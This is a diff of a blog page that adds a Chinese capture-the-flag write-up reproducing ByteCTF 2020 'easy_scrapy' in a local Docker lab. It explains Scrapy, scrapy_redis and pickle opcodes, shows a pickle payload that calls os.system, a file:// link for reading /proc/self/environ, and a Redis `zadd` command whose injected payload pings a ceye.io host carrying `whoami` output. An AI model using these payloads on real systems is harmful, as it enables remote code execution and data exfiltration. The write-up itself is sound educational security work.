@@ -13,7 +13,7 @@
      <div class="sidebar animated fadeInDown">
    <div class="logo-title">
     <div class="title">
-     <img src="https://ablacknut.github.io/images/avatar.png?v=1604941113666" style="width:127px;" />
+     <img src="https://ablacknut.github.io/images/avatar.png?v=1605451939812" style="width:127px;" />
 
      <h3 title=""><a href="/">blacknut</a></h3>
 
@@ -82,10 +82,329 @@
         <h3><a>ByteCTF2020-easy_scrapy复现</a></h3>
        </div>
        <div class="post-content">
-        <!-- more -->
-<figure data-type="image" tabindex="1"><img src="https://ablacknut.github.io/post-images/1604940940011.png" alt="" loading="lazy"></figure>
-<pre><code>this is a test code
+        <h1 id="说一下">说一下</h1>
+<ul>
+<li>bytectf比赛都已经过了三个星期了，终于把这个题目复现一下，期间把scrapy框架学了一下，scrapy真好用！！！python的pickle反序列化也弄明白了，真有点难度。</li>
+<li>这么长时间了，赛题的环境已经关掉了，还好有师傅把题目保存下来了，还有docker文件，在本地搭建一下，来一场佛系复现。主要不是为了做题，要把知识点搞明白。</li>
+</ul>
+<h1 id="环境搭建">环境搭建</h1>
+<ul>
+<li>题目环境：<u>https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020</u></li>
+<li><code>git clone</code>到本地后，<code>docker-compose up -d</code>会发现只启动了<br>
+<img src="https://ablacknut.github.io/post-images/1605433124658.jpg" alt="" loading="lazy"></li>
+<li><code>docker-compose logs 容器ID</code> <img src="https://ablacknut.github.io/post-images/1605437885750.jpg" alt="" loading="lazy"></li>
+<li>发现报错，提示没有spiders这么模块，我们到<code>easyscrapy/python/bytectf/spiders</code>目录下，<code>touch __init__py</code>新建一个__init__py文件，在重新创建docker镜像。</li>
+<li><img src="https://ablacknut.github.io/post-images/1605434454815.jpg" alt="" loading="lazy"></li>
+<li>环境搭好后发现，看了下官方的writeups  <u>https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg</u>，接下来就是本地文件读取来读源代码。但是没有web界面了，只能手动push start_urls了。start_urls是scrapy爬虫的初始爬取列表。</li>
+</ul>
+<h1 id="scrapy">scrapy</h1>
+<ul>
+<li>为了能看懂题，有必要把scrapy弄明白。</li>
+<li>我们自己用requests写一个简单的爬虫的一般流程就是
+<ul>
+<li>请求初始url</li>
+<li>获取url对应html</li>
+<li>解析文本，获取数据来保存，获取链接继续重复第一条</li>
+</ul>
+</li>
+<li>简单来说如果使用scrapy，那我们就只需要指定初始url，实现解析文本这一阶段的内容。</li>
+</ul>
+<h2 id="scrapy-项目结构">scrapy 项目结构</h2>
+<p><code>scrapy startproject tutorial</code> 新建一个scrapy项目</p>
+<pre><code>• scrapy.cfg: 项目的配置文件
+• tutorial/: 该项目的python模块。之后您将在此加入代码。
+• tutorial/items.py: 项目中的item文件。在文件中定义要保存的数据(item)，需要继承scrapy.Item。
+• tutorial/pipelines.py: 项目中的pipelines文件。实现ItemPipeline，会将spiders中定义的回调函数(默认parse)返回的item数据进行保存。
+• tutorial/settings.py: 项目的设置文件。
+• tutorial/spiders/xxx.py: 放置spider代码的目录.。实现Spiders(爬虫)，需要继承scrapy.Spider类，Spider还有多个子类，实现了不同功能。
 </code></pre>
+<h2 id="scpary组件">scpary组件</h2>
+<ul>
+<li>scrapy由 <strong>Spiders(爬虫)、Engine(引擎)、Scheduler(调度器)、Downloader(下载器)、ItemPipeline(管道)、Downloader Middlewares(下载中间件)、Spider Middlewares(Spider中间件)</strong> 构成。
+<table>
+<thead>
+<tr>
+<th style="text-align:left">组件名</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">手动实现</th>
+<th style="text-align:left">对应项目文件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Engine</td>
+<td style="text-align:left">负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等</td>
+<td style="text-align:left">scrapy已实现</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Scheduler</td>
+<td style="text-align:left">负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</td>
+<td style="text-align:left">scrapy已实现</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Downloader</td>
+<td style="text-align:left">下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理</td>
+<td style="text-align:left">scrapy已实现</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Spiders</td>
+<td style="text-align:left">负责处理所有Responses,从中分析提取数据，并将需要跟进的URL提交给引擎</td>
+<td style="text-align:left">需要手写</td>
+<td style="text-align:left">tutorial/spiders/xxx.py</td>
+</tr>
+<tr>
+<td style="text-align:left">ItemPipeline</td>
+<td style="text-align:left">负责处理Spider中获取到数据，并进行进行后期处理（详细分析、过滤、存储等）的地方</td>
+<td style="text-align:left">需要手写</td>
+<td style="text-align:left">tutorial/pipelines.py</td>
+</tr>
+<tr>
+<td style="text-align:left">Downloader Middlewares</td>
+<td style="text-align:left">可以自定义的下载扩展，比如设置代理</td>
+<td style="text-align:left">需要手写(可选择)</td>
+<td style="text-align:left">tutorial\middlewares.py</td>
+</tr>
+<tr>
+<td style="text-align:left">Spider Middlewares</td>
+<td style="text-align:left">可以自定义requests请求和进行response过滤</td>
+<td style="text-align:left">需要手写(可选择)</td>
+<td style="text-align:left">tutorial\middlewares.py</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+<h2 id="scrapy执行流程">scrapy执行流程</h2>
+<ol>
+<li>首先Spiders（爬虫）将需要发送请求的url(requests)经ScrapyEngine（引擎）交给Scheduler（调度器）。如果是初始请求，url就是Spiders下的start_urls列表</li>
+<li>Scheduler（排序，入队）处理后，经ScrapyEngine，DownloaderMiddlewares(可选)交给Downloader。</li>
+<li>Downloader向互联网发送请求，并接收下载响应（response，将请求封装成Response对象）。将响应（response）经ScrapyEngine，SpiderMiddlewares(可选)交给Spiders。</li>
+<li>Spiders处理response(默认是Spiders下的parse函数)，提取<strong>数据</strong>并将数据经ScrapyEngine交给ItemPipeline保存（可以是本地，可以是数据库）。</li>
+<li>Spiders提取url重新经ScrapyEngine交给Scheduler进行下一个循环。直到无url请求程序停止结束。</li>
+</ol>
+<h2 id="scrapy_redis">scrapy_redis</h2>
+<ul>
+<li>
+<p>scrapy_redis是一个以redis为基础的scrapy组件，主要作用是为了实现分布式爬虫。</p>
+</li>
+<li>
+<p>scrapy-redis提供了以下四个组件</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">组件名</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">和scrapy区别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Scheduler</td>
+<td style="text-align:left">基于redis实现请求队列</td>
+<td style="text-align:left">scrapy在对请求进行调度是基于内存的，现在是基于redis，所以需要请求的对象就会保存在redis中</td>
+</tr>
+<tr>
+<td style="text-align:left">Duplication Filter</td>
+<td style="text-align:left">请求对象去重(Request)，对爬取过的对象提取hash</td>
+<td style="text-align:left">该hash也会保存在redis中</td>
+</tr>
+<tr>
+<td style="text-align:left">Item Pipeline</td>
+<td style="text-align:left">将item对象保存在redis中，可以不启用</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Base Spider</td>
+<td style="text-align:left">实现了可以支持从redis中提取urls的spider</td>
+<td style="text-align:left">scrapy的爬虫对象只能从start_urls获取初始请求url，并且没有请求对象生成爬虫就会关闭，scrapy-redis的爬虫可一直保持存活状态，知道由requests请求来再请求爬取</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>我们可以用scrapy_redis的样例来弄清楚它对redis里存了什么</p>
+<ul>
+<li><code>git clone https://github.com/rmax/scrapy-redis.git</code>，然后进入example-project文件内，修改example\spiders\mycrawler_redis.py代码：将里面的redis_key删掉，redis_key指定了爬虫从redis里面那个键里面获取初始url，不指定默认是“name:start_urls”，是一个列表。删除__init__，限制了域名。<pre><code class="language-python">class MyCrawler(RedisCrawlSpider):
+    &quot;&quot;&quot;Spider that reads urls from redis queue (myspider:start_urls).&quot;&quot;&quot;
+    name = 'mycrawler_redis'
+
+    rules = (
+        Rule(LinkExtractor(), callback='parse_page', follow=True), )
+    def parse_page(self, response):
+        return {
+            'name': response.css('title::text').extract_first(),
+            'url': response.url,
+        }
+</code></pre>
+</li>
+<li>在setting.py中添加配置，指明redis在哪个机器上<pre><code class="language-python">REDIS_URL = &quot;redis://192.168.64.136:6379&quot;
+</code></pre>
+</li>
+<li>修改后进入在example目录中执行，<code>scrapy crawl mycrawler_redis</code>，可以看到爬虫已经打开，但是没有进行爬取<img src="https://ablacknut.github.io/post-images/1605445210846.jpg" alt="" loading="lazy"></li>
+<li>进到192.168.64.136服务器中，进入redis终端<pre><code class="language-shell">blacknut@ubuntu:~$ redis-cli
+ 127.0.0.1:6379&gt; lpush mycrawler_redis:start_urls https://www.dmoz-odp.org/
+ (integer) 1
+</code></pre>
+</li>
+<li>可以看到爬虫从redis服务器中获取了一个请求，并且提取了响应中的url继续爬取<img src="https://ablacknut.github.io/post-images/1605445281900.jpg" alt="" loading="lazy"></li>
+<li>此时我们看redis中有哪些东西：<img src="https://ablacknut.github.io/post-images/1605445346367.jpg" alt="" loading="lazy"></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">键名名</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">spidername:requests</td>
+<td style="text-align:left">调度器队列，保存待请求的对象，是pickle反序列化后的Request对象</td>
+<td style="text-align:left">zset</td>
+</tr>
+<tr>
+<td style="text-align:left">spidername:dupefilter</td>
+<td style="text-align:left">保存已经抓取过请求的hash</td>
+<td style="text-align:left">set</td>
+</tr>
+<tr>
+<td style="text-align:left">spidername:items</td>
+<td style="text-align:left">保存的items数据，只有scrapy_redis.pipelines.RedisPipeline开启的情况下才会保存</td>
+<td style="text-align:left">list</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+<h1 id="题目代码">题目代码</h1>
+<ul>
+<li>我们直接结合题目的代码，理解scrapy。<br>
+BYTECTF<br>
+├─spiders<br>
+│  ├─__init__.py<br>
+│  └─byte.py<br>
+├─__init__.py<br>
+├─items.py<br>
+├─middlewares.py<br>
+├─piplines.py<br>
+└─setting.py</li>
+</ul>
+<h2 id="itemitemspy">item：items.py</h2>
+<figure data-type="image" tabindex="2"><img src="https://ablacknut.github.io/post-images/1605445885233.jpg" alt="" loading="lazy"></figure>
+<ul>
+<li>BytectfItem就是这个爬虫想要获取的数据，12 13 141行定义了三个字段。</li>
+<li>这个类实例化后，就可以像python的字典一样使用，具体可以看spider文件内</li>
+</ul>
+<h2 id="spider-spidersbytepy">spider: spiders/byte.py</h2>
+<figure data-type="image" tabindex="3"><img src="https://ablacknut.github.io/post-images/1605445670461.jpg" alt="" loading="lazy"></figure>
+<ul>
+<li>这个类就是主要spider组件，用来解析响应</li>
+<li>12行实例化了一个<code>byte_item=BytectfItem()</code>   ，在13 28 29行分别存储了起始URL，当前URL和当前页面内容</li>
+<li>15-27行，就是从响应内容中提取所有&lt;a&gt;标签中的链接，最多提取三个。第22行由提取的URL生成了Request对象，并且制定了该对象返回的请求由<code>parse2</code>函数解析。第24行就是返回了由提取的url生成的Request对象，这个Request对象会进入调度器，由调度器分配下一次请求。</li>
+<li>30行，就是返回byteitem对象，其中保存了我们想要的数据</li>
+<li><code>parse2</code>函数就很简单了，返回了保存有请求url和响应内容的item对象。</li>
+</ul>
+<h2 id="piplinespy">piplines.py</h2>
+<figure data-type="image" tabindex="4"><img src="https://ablacknut.github.io/post-images/1605446704995.jpg" alt="" loading="lazy"></figure>
+<ul>
+<li>这个文件对应了 <strong>ItemPipeline</strong> 组件，由spider中的parse函数返回的item数据会经过这段代码处理。</li>
+<li>可以看到它连接了mongodb，也知道了服务器地址，用户名，密码。</li>
+<li>在<code>process_item</code>函数中可以看到，spider返回的item被保存到了mongodb中。</li>
+</ul>
+<h2 id="settingpy">setting.py</h2>
+<figure data-type="image" tabindex="5"><img src="https://ablacknut.github.io/post-images/1605447006436.jpg" alt="" loading="lazy"></figure>
+<ul>
+<li>一个重要的配置文件，其中指明了redis的地址和端口，也发现redis是没有设置密码的。</li>
+</ul>
+<h1 id="pickle反序列化">pickle反序列化</h1>
+<ul>
+<li>pickle反序列化也有挺多内容，我们就简单讲一下</li>
+</ul>
+<h2 id="python的pickle模块使用">python的pickle模块使用</h2>
+<ul>
+<li>序列化</li>
+</ul>
+<pre><code class="language-python">import pickle
+data = ['aa', 'bb', 'cc']  
+p_str = pickle.dumps(data)
+</code></pre>
+<ul>
+<li>反序列化</li>
+</ul>
+<pre><code class="language-python">mes = pickle.loads(p_str)
+</code></pre>
+<h2 id="反序列化原理">反序列化原理</h2>
+<ul>
+<li>pickle序列化后的字符串是由多个指令组成，这些指令一定以一个字节的指令码（opcode）开头，并且其后的内容是根据指令码决定其是否是指令的一部分(有点像汇编)</li>
+<li>组件
+<ul>
+<li>指令引擎（Instruction engine）：从pickle反序列化流中读取并执行指令</li>
+<li>栈（Stack）：一个栈结构，是主要进行数据操作的地方。</li>
+<li>存储区(Memo)：可以类比内存，用于存取变量。它是一个数组，以下标为索引。</li>
+</ul>
+</li>
+<li>所有指令执行完毕后，最后在栈顶的元素就是反序列化后的结果</li>
+<li>一些指令的介绍
+<ul>
+<li>翻译自 <u>http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</u><br>
+<img src="https://ablacknut.github.io/post-images/1605447784107.jpg" alt="" loading="lazy"></li>
+</ul>
+</li>
+<li>我们来手动构造一个反序列化字符串，方便大家理解：
+<ul>
+<li>从表里面可以看到<code>V</code>，<code>(</code>，<code>t</code>，<code>.</code>三个指令的作用</li>
+<li>我们构造一个字符串<pre><code class="language-python">&gt;&gt;&gt; a = b'(Vtest\nt.'
+ &gt;&gt;&gt; b = pickle.loads(a)
+ &gt;&gt;&gt; b
+ ('test',)
+ &gt;&gt;&gt;
+</code></pre>
+</li>
+<li>可以看到b是一个数组，我们来解释一下这个字符串。首先记住pickle自己维护了一个栈区，<code>（</code>在栈里面放了一个<code>mark</code>符号；<code>Vtest\n</code>在栈里面放了一个<code>'test'</code>字符串；<code>t</code>就是弹出了栈中直到<code>mark</code>符号；将<code>mark</code>符号前的内容放入一个元组并且又放回了栈内，那就是将<code>test</code>字符串放入了一个元组；<code>.</code>停止符，结束了反序列化操作。最后栈顶就有了一个<code>('test',)</code>。最终反序列化内容就是一个元组<code>('test',)</code>。</li>
+<li>这样我们就可以在构造一个可以执行命令的payload<pre><code class="language-python">&gt;&gt;&gt; a = b'cos\nsystem\n(Vping \ntR(Vtest\nt.' 
+ &gt;&gt;&gt; b = pickle.loads(a)                        
+ 26111                                          
+ &gt;&gt;&gt; b                                          
+ ('test',)                                      
+ &gt;&gt;&gt;                                            
+</code></pre>
+</li>
+<li>发现在反序列化的时候执行了，payload里面的whoami命令。这里面我们又用到了两个新指令<code>c</code>和<code>R</code>。<code>c</code>是读取两个字符串，第一个作为模块名，第二个作为对象名，这里面就是os 和system，然后将os.system压入栈中，os.system是一个可调用对象；R是将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。可以自己根据字符串，分析一下整个过程。</li>
+<li>并且我们发现，b最终的值还是一个元组，原因是R虽然将system的返回值压入了栈，但是我们又在栈顶放了一个元组，最终栈顶的元组就是我们的反序列化结果。这样我们就可以将<code>'cos\nsystem\n(Vwhoami\ntR'</code>，放到任意一个反序列化字符串前面。不影响最终结果还执行了命令。不过看到过文章说是，某个版本如果结束时栈顶有一个以上元素会报错，那我们可以使用<code>'cos\nsystem\n(Vwhoami\ntR0'</code>，指令<code>0</code>是将栈顶元素弹出。<br>
+#题目复现</li>
+</ul>
+</li>
+<li>搞明白这么多，我们再来看题目</li>
+<li>首先爬虫里，会提取首页面的地址，并访问保存内容。而且没有限制。如果里面有一个链接指向了本地文件，那就可以本地文件泄露了</li>
+<li>srapy_redis 里面的 <code>bytectf:requests</code>，里面保存了pickle反序列后的request对象，如果可以往这里面加一个代码执行payload的反序列字符串，那就可以执行命令了。</li>
+<li>scrapy不支持<code>gopher</code>协议。但是题目中有一个result页面，可以无回显sstf，使用的是pycurl，支持<code>gopher</code>协议。</li>
+</ul>
+<h2 id="预期解思路">预期解思路</h2>
+<ol>
+<li>首先在web界面，访问一个我们的vps，vps网页里写入内容<code>&lt;a href='file:////proc/self/environ'&gt;&lt;/a&gt;</code>，找到代码路径后，根据scrapy的项目结构，把其他的源码都读出来。</li>
+<li>在源码中可以找到redis服务器地址</li>
+<li>利用result页面的ssrf，打redis，payload是<pre><code>zadd byte:requests 0 &quot;cos\nsystem\n(Vping `whoami`.ip.port.hembie.ceye.io\ntR.&quot;`
+</code></pre>
+</li>
+</ol>
+<h2 id="佛系复现">佛系复现</h2>
+<ul>
+<li>因为没有web界面了，也没办法利用ssrf，就不用构造gopher+ssrf的payload了(这个应该不难)，那我们就手动进入redis容器，执行：</li>
+</ul>
+<pre><code class="language-shell">redis-cli
+127.0.0.1:6379&gt; zadd byte:requests 0 &quot;cos\nsystem\n(Vping `whoami`.ip.port.hembie.ceye.io\ntR.&quot;
+(integer) 1
+</code></pre>
+<ul>
+<li>出来我们查看以下scrapy容器日志，<code>docker log 容器ID</code>：<br>
+<img src="https://ablacknut.github.io/post-images/1605451874569.jpg" alt="" loading="lazy"><br>
+再看下ceye：<img src="https://ablacknut.github.io/post-images/1605451907620.jpg" alt="" loading="lazy"></li>
+<li>成功执行命令。结束下班。</li>
+</ul>
 
        </div>
        <div class="post-footer">
